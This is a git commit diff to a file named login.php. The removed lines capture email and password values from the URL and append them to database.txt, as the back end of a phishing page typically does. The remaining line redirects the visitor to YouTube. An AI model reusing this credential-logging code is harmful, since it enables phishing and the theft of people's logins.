5e0623a838a2b934a7cf8c1c13a22d0e59378616
Izeick <metro_2033_nik@mail.ru>
2021-01-22 16:58:53 +0300

    Update login.php

--- login.php
+++ login.php
@@ -1,15 +1,5 @@
 <?PHP
 
-$Log = $_GET['email'];
-
-$Pass = $_GET['pass'];
-
-$log = fopen("database.txt","at");
-
-fwrite($log,"\n $Log:$Pass \n");
-
-fclose($log);
-
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://youtube.com'></head></html>";
 
 ?>
